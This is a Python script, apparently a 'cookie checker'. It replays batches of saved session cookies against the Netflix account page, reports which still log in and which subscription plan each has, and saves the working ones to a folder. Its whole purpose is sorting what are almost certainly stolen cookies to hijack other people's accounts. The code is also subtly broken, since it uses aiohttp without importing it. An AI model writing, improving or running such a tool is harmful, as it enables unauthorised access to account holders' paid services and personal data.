import json
import os
import sys
import asyncio
import time

print("Initializing!, Please wait...\n")
working_cookies_path = "working_cookies"
exceptions = 0
working_cookies = 0
expired_cookies = 0
start = time.time()

num_threads = 5  # Define the number of threads here


# ___________________________________________
# | Network Speed | Recommended no. threads |
# |---------------|-------------------------|
# | < 5 Mbps      | 1-3                     |
# | 5-20 Mbps     | 3-5                     |
# | 20-100 Mbps   | 5-10                    |
# | > 100 Mbps    | 10-20                   |
# |_________________________________________|


async def load_cookies_from_json(json_cookies_path):
    with open(json_cookies_path, "r", encoding="utf-8") as cookie_file:
        cookie = json.load(cookie_file)
    return cookie


async def open_webpage_with_cookies(session, link, json_cookies, filename):
    global working_cookies
    global expired_cookies

    # Request the page
    await session.get(link)

    # Clear all existing cookies
    session.cookie_jar.clear()

    for cookie in json_cookies:
        session.cookie_jar.update_cookies({cookie["name"]: cookie["value"]})

    async with session.get(link) as response:
        content = await response.text()
        if "Sign In" in content or "Sign in" in content:
            print(f"Cookie Not working - {filename}")
            expired_cookies += 1
        else:
            plan = (
                "Premium"
                if "<b>Premium</b>" in content
                else (
                    "Basic"
                    if "<b>Basic</b>" in content
                    else "Standard" if "<b>Standard</b>" in content else "Unknown"
                )
            )
            print(f"Cookie Working - {filename} | Plan: {plan}")
            try:
                os.mkdir(working_cookies_path)
                working_cookies += 1
                return content  # Return content if the cookie is working
            except FileExistsError:
                working_cookies += 1
                return content  # Return content if the cookie is working


async def process_cookie_file(filename):
    filepath = os.path.join("json_cookies", filename)
    if os.path.isfile(filepath):
        with open(filepath, "r", encoding="utf-8"):
            url = "https://www.netflix.com/YourAccount"
            try:
                cookies = await load_cookies_from_json(filepath)
                async with aiohttp.ClientSession() as session:
                    content = await open_webpage_with_cookies(
                        session, url, cookies, filename
                    )
                    if content:
                        # Save working cookies to JSON file
                        with open(f"working_cookies/{filename}.json", "w") as json_file:
                            json.dump(cookies, json_file)
            except json.decoder.JSONDecodeError:
                print(
                    f"Please use cookie_converter.py to convert your cookies to json format! (File: {filename})\n"
                )
                global exceptions
                exceptions += 1
            except Exception as e:
                print(f"Error occurred: {str(e)} - {filename}\n")
                exceptions += 1


async def main():
    tasks = []
    for filename in os.listdir("json_cookies"):
        task = asyncio.create_task(process_cookie_file(filename))
        tasks.append(task)
        if len(tasks) >= num_threads:
            await asyncio.gather(*tasks)
            tasks = []
    if tasks:
        await asyncio.gather(*tasks)


try:
    asyncio.run(main())
    end = time.time()
    print(
        f"\nSummary:\nTotal cookies: {len(os.listdir('json_cookies'))}\nWorking cookies: {working_cookies}\nExpired cookies: {expired_cookies}\nInvalid cookies: {exceptions}\nTime Elapsed: {end - start} Seconds"
    )
except KeyboardInterrupt:
    print("\n\nProgram Interrupted by user")
    sys.exit()
